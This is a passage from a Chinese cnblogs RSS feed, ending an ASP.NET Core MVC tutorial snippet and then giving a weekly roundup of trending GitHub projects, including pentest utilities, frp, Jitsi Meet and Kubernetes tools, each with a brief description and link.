    &lt;/span&gt;=&amp;gt; Task.FromResult(&lt;span&gt;new&lt;/span&gt; ContentResult(_html, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));

    [HttpGet(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ValueTask&amp;lt;ContentResult&amp;gt;&lt;span&gt; BarAsync()
    &lt;/span&gt;=&amp;gt; &lt;span&gt;new&lt;/span&gt; ValueTask&amp;lt;ContentResult&amp;gt;(&lt;span&gt;new&lt;/span&gt; ContentResult(_html, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;text/html&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));

    [HttpGet(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Task&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt; BazAsync() =&amp;gt;&lt;span&gt; Task.FromResult(_html);

    [HttpGet(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/qux&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; ValueTask&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt; QuxAsync() =&amp;gt; &lt;span&gt;new&lt;/span&gt; ValueTask&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt;(_html);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们在上述四个Action方法上通过标注HttpGetAttribute特性将路由模板分别设置为“/foo”、“/bar”、“/baz”和“/qux”，所以我们可以采用相应的URL来访问这四个Action方法。下图所示的是这个Action的响应内容在浏览器上的呈现。由于Action方法Baz和Qux返回的是一个字符串，按照ActionResultTypeMapper类型提供的转换规则，最终返回的将是以此字符串作为响应内容，内容类型为 “text/plain” 的ContentResult对象。源代码从&lt;a href=&quot;https://files.cnblogs.com/files/artech/S503.7z&quot;&gt;这里&lt;/a&gt;下载。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200323082708300-1202041407.png&quot;&gt;&lt;img width=&quot;388&quot; height=&quot;370&quot; title=&quot;5-3&quot; alt=&quot;5-3&quot; src=&quot;https://img2020.cnblogs.com/blog/19327/202003/19327-20200323082708646-1658165071.png&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-01.html&quot;&gt;通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[上篇]：路由整合&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-02.html&quot;&gt;通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[中篇]: 请求响应&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-03.html&quot;&gt;通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[下篇]：参数绑定&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Mon, 23 Mar 2020 00:27:00 +0000</pubDate>
<dc:creator>Artech</dc:creator>
<og:description>《200行代码，7个对象——让你了解ASP.NET Core框架的本质》让很多读者对ASP.NET Core管道有了真实的了解。在过去很长一段时间中，有很多人私信给我：能否按照相同的方式分析一下MVC</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/artech/p/12550074.html</dc:identifier>
</item>
<item>
<title>GitHub 热点速览 Vol.12：不可思议的浏览器 browser-2020 周涨 star 超 3 千 - 削微寒</title>
<link>http://www.cnblogs.com/xueweihan/p/12548976.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xueweihan/p/12548976.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223122148-711320099.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;作者：HelloGitHub-小鱼干&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;摘要：本周的 GitHub Trending 像极最近的天气，温暖如春突然来个急降温。新晋 GitHub 项目重启屈指可数的模式，好在老项目们表现甚好。比如一周就获得超过 3 千 star 的不可思议浏览器：browser-2020，它告诉你有哪些不可思议的 feature 可以出现在 2020 年的浏览器中。除了这个不可思议的浏览器，视频工具也是个不可思议的 GitHub 老项目：Jitsi Meet 本周也获得了超过 800 个 star，占据本周 GitHub Trending 周榜。当然周榜还有上周推荐过的疫情可视化项目 COVID-19 加上本周获得 5,000+ 个 star 项目总 star 成功破万。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以下内容摘录自上周　HelloGitHub 微博的 GitHub Trending，选项标准：&lt;code&gt;新发布&lt;/code&gt; | &lt;code&gt;实用&lt;/code&gt; | &lt;code&gt;有趣&lt;/code&gt;，根据项目 release 时间分类，发布时间超过 30 天的项目一律称之为成熟稳重老项目，由于文章篇幅问题还有部分项目未能在本文展示，望周知 🌝&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;本文目录
&lt;ul&gt;&lt;li&gt;
&lt;ol&gt;&lt;li&gt;可怕 GitHub 新生&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;1.1 资产管理：Bayonet&lt;/li&gt;
&lt;li&gt;1.2 英特尔网卡驱动：itlwm&lt;/li&gt;
&lt;li&gt;1.3 AutoML 资料库：automl&lt;/li&gt;
&lt;li&gt;1.4 一个 App 学 Android：Foodium&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;尚能星否 GitHub 老项目&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;2.1 渗透测试：pentest-tools&lt;/li&gt;
&lt;li&gt;2.2 面试复习笔记：Front-End-Interview-Notebook&lt;/li&gt;
&lt;li&gt;2.3 命令备忘工具：NAVI&lt;/li&gt;
&lt;li&gt;2.4 反向代理：frp&lt;/li&gt;
&lt;li&gt;2.5 不可思议的浏览器：browser-2020&lt;/li&gt;
&lt;li&gt;2.6 视频工具：Jitsi Meet&lt;/li&gt;
&lt;li&gt;2.7 会议系统：BigBlueButton&lt;/li&gt;
&lt;li&gt;2.8 终端 UI：lazygit&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;本周 GitHub Trending #k8s#主题的主力军&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;3.1 k8s IDE：Lens&lt;/li&gt;
&lt;li&gt;3.2 k8s 最佳实践：follow-me-install-kubernetes-cluster&lt;/li&gt;
&lt;li&gt;3.3 可视化部署：StatusBay&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;推荐阅读&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;1-可怕-github-新生&quot;&gt;1. 可怕 GitHub 新生&lt;/h2&gt;
&lt;h3 id=&quot;11-资产管理：bayonet&quot;&gt;1.1 资产管理：Bayonet&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：450+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Bayonet 是整合多款安全工具并以 Web 形式展现，它辅助渗透测试人员对 IT 资产进行资产管理。功能点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;子域名扫描：oneforall&lt;/li&gt;
&lt;li&gt;端口服务扫描：shodan + 异步 socket + nmap（ip 数据库、CDN 判断）&lt;/li&gt;
&lt;li&gt;URL可用探测&lt;/li&gt;
&lt;li&gt;驱动浏览器爬虫采集数据：crawlergo&lt;/li&gt;
&lt;li&gt;被动漏洞扫描：xray&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/CTF-MissFeng/bayonet&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223238705-1614954422.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;12-英特尔网卡驱动：itlwm&quot;&gt;1.2 英特尔网卡驱动：itlwm&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：200+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;itlwm 是一个基于 OpenBSD 的 macOS 英特尔网卡驱动。支持的设备，3 系：3160、3165、3168，7 系：7260、7265，8 系：8260、8265。不要看那显示的是个以太网，因为作者并没有使用苹果的 IO80211Family，而是像 USB 网卡一样，使用以太网接口上网。目前支持无加密 Wi-Fi 连接，Wi-Fi 名字已经写死，可以手机分享无加密的 Wi-Fi，名字叫 Redmi，加载驱动之后会自动连接上。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/zxystd/itlwm&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223250977-685984427.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;13-automl-资料库：automl&quot;&gt;1.3 AutoML 资料库：automl&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：850+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;automl 是谷歌开源的收录与 AutoML 相关的模型和库的列表的项目，项目刚开源单日获得超 400 个 star。 ​​​​&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/google/automl&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;14-一个-app-学-android：foodium&quot;&gt;1.4 一个 App 学 Android：Foodium&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：200+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Foodium 是一个使用现在工具开发的 Android App，项目使用了 Kotlin, Coroutines, Flow, Dagger 2, Architecture Components, MVVM, Room, Retrofit, Moshi, Material Components 进行开发。Foodium 从 API 加载 post 数据并将其存储在持久性存储中(即 SQLite 数据库)。Post 总是从本地数据库加载，远程数据(自 API )和本地数据会保持同步。如果你想学习一个完整 App 的开发，不妨试试这个使用多个组件和开发工具的项目。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/PatilShreyas/Foodium&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223308092-1963305128.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;2-尚能星否-github-老项目&quot;&gt;2. 尚能星否 GitHub 老项目&lt;/h2&gt;
&lt;h3 id=&quot;21-渗透测试：pentest-tools&quot;&gt;2.1 渗透测试：pentest-tools&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：450+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;pentest-tools 收集一套渗透测试中常用的脚本，包括：收集子域名信息、arpa 格式地址转换为普通格式、指定 DNS 区域传送测试、从给定 HTML 文件提取链接等等功能。 ​​​​&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/gwen001/pentest-tools&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223317687-229842132.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;22-面试复习笔记：front-end-interview-notebook&quot;&gt;2.2 面试复习笔记：Front-End-Interview-Notebook&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：300+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Front-End-Interview-Notebook 是作者校招时的前端复习笔记，主要总结一些比较重要的知识点和前端面试问题，涵盖：HTML、CSS、Javascript、算法、计算机网络、工具、面试记录等七方面内容。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→hhttps://github.com/CavsZhouyou/Front-End-Interview-Notebook&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;23-命令备忘工具：navi&quot;&gt;2.3 命令备忘工具：NAVI&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：250+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NAVI 是一个命令行的交互式备忘单工具，它允许你浏览备忘单（可自己编写或从维护者那里下载文件）并执行命令，并提示你输入参数值，它基于 fzf。当然，它可以是命令或仅作为 shell widget。&lt;/p&gt;
&lt;p&gt;如果刚学习 Linux 命令，不妨试试这个项目可以帮你快速掌握命令的用法。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/denisidoro/navi&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223331717-2142799586.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;24-反向代理：frp&quot;&gt;2.4 反向代理：frp&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：250+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。 ​​​​&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/fatedier/frp&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223343231-1457895849.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;25-不可思议的浏览器：browser-2020&quot;&gt;2.5 不可思议的浏览器：browser-2020&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：3200+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;2020 年，浏览器扮演着什么角色呢？browser-2020 收录了目前浏览器中实现的一些不太为人所知的特性，包括首选配色、付款请求、网络共享、推送、AR 速览、徽章系统等等。browser-2020 收录的列表不是为技术人员准备的，相反，它旨在成为一个“我不知道我们可以在浏览器中这样做!”的列表。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/luruke/browser-2020&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;26-视频工具：jitsi-meet&quot;&gt;2.6 视频工具：Jitsi Meet&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：800+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Jitsi Meet 是一个安全、简单和可扩展的视频会议工具，你无需安装任何软件可在浏览器中直接运行使用。它允许你流式传输桌面或仅部分窗口，可以通过简单的自定义网址可与整个团队进行视频聊天，并邀请用户参加会议。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/jitsi/jitsi-meet&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223356160-767862309.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;27-会议系统：bigbluebutton&quot;&gt;2.7 会议系统：BigBlueButton&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：400+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;BigBlueButton 是一个开源的 Web 会议系统，支持音频、视频、幻灯片（带有白板控件），支持聊天和屏幕实时共享，用户可使用 emoji 进行互动，此外，BigBlueButton 还支持多人白板和分组讨论，在视频方面，它可以帮你记录视频及回放内容方便以后同他人共享。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/wxbool/video-srt-windows&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;28-终端-ui：lazygit&quot;&gt;2.8 终端 UI：lazygit&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：450+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;lazygit 是一个用于 Git 命令行的简单终端 UI，使用 Go 语言编写，用到了 gocui 库，目的是在命令行提供 Git 的图形界面。特性&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;轻松添加文件&lt;/li&gt;
&lt;li&gt;解决合并冲突&lt;/li&gt;
&lt;li&gt;轻松检出最近的分支&lt;/li&gt;
&lt;li&gt;滚动查看 branches/commits/stash 的日志和差异信息&lt;/li&gt;
&lt;li&gt;快速进行 pushing/pulling 操作&lt;/li&gt;
&lt;li&gt;压缩并重命名 commits 信息&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→hhttps://github.com/jesseduffield/lazygit&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223411345-1660494544.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;3-本周-github-trending-k8s主题的主力军&quot;&gt;3. 本周 GitHub Trending #k8s#主题的主力军&lt;/h2&gt;
&lt;p&gt;无论是本周 GitHub Trending 热门主题还是技术圈最近的热门话题，k8s 是当之无愧的热点，在这里小鱼干给你分享 3 个本周 GitHub Trending 上和 k8s 相关的项目，希望这 3 个项目能让你一览 k8s 的独特魅力~&lt;/p&gt;
&lt;h3 id=&quot;31-k8s-ide：lens&quot;&gt;3.1 k8s IDE：Lens&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：1050+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Lens 是一个可用户 k8s 集群控制的 IDE，适用 macOS、Linux、Windows。特性：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;多集群管理；支持数百个集群&lt;/li&gt;
&lt;li&gt;独立应用程序；无需在集群中安装任何东西&lt;/li&gt;
&lt;li&gt;实时集群状态可视化&lt;/li&gt;
&lt;li&gt;内置 Prometheus 支持的资源利用率图表和趋势以及历史记录&lt;/li&gt;
&lt;li&gt;终端访问节点和容器&lt;/li&gt;
&lt;li&gt;性能经过优化以处理大型集群（已对运行 25k pod 的集群进行了测试）&lt;/li&gt;
&lt;li&gt;全面支持 Kubernetes RBAC&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/lensapp/lens&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223425982-1330927040.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;32-k8s-最佳实践：follow-me-install-kubernetes-cluster&quot;&gt;3.2 k8s 最佳实践：follow-me-install-kubernetes-cluster&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：50+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;又一个 k8s 项目，follow-me-install-kubernetes-cluster 可以带你一步步部署 k8s 集群。&lt;br/&gt;本系列文档介绍使用二进制部署 kubernetes v1.16.6 集群的所有步骤（Hard-Way 模式）。在部署的过程中，将详细列出各组件的启动参数，它们的含义和可能遇到的问题。部署完成后，你将理解系统各组件的交互原理，进而能快速解决实际问题。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/opsnull/follow-me-install-kubernetes-cluster&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223437903-1137010423.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;33-可视化部署：statusbay&quot;&gt;3.3 可视化部署：StatusBay&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;本周 star 增长数：50+&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;StatusBay 是一个用 GO 编写的可视化 k8s 部署过程的项目，它通过订阅 k8s 集群，从 k8s 收集所有相关事件并逐步“放大”部署过程来做到这一点。StatusBay 主要目标是减轻 k8s 的故障排除和调试服务的体验，并在进行更改时提供信心。&lt;br/&gt;StatusBay 设计为动态且可扩展的，可轻松地在不同的指标提供程序集成，以便随时间监控部署质量。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;GitHub 地址→https://github.com/similarweb/statusbay&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200322223451128-748019515.gif&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;推荐阅读&quot;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;以上为 2020 年第 12 个工作周的 GitHub Trending 🎉如果你 Pick 其他好玩、实用的 GitHub 项目，记得来 HelloGitHub issue 区和我们分享下哟 🌝&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;HelloGitHub 交流群现已全面开放，添加微信号：HelloGitHub 为好友入群，可同前端、Java、Go 等各界大佬谈笑风生、切磋技术~&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/759200/202002/759200-20200217165012919-1203910757.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关注公众号加入交流群&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 23 Mar 2020 00:22:00 +0000</pubDate>
<dc:creator>削微寒</dc:creator>
<og:description>作者：HelloGitHub 小鱼干 摘要：本周的 GitHub Trending 像极最近的天气，温暖如春突然来个急降温。新晋 GitHub 项目重启屈指可数的模式，好在老项目们表现甚好。比如一周就</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xueweihan/p/12548976.html</dc:identifier>
</item>
</channel>
</rss>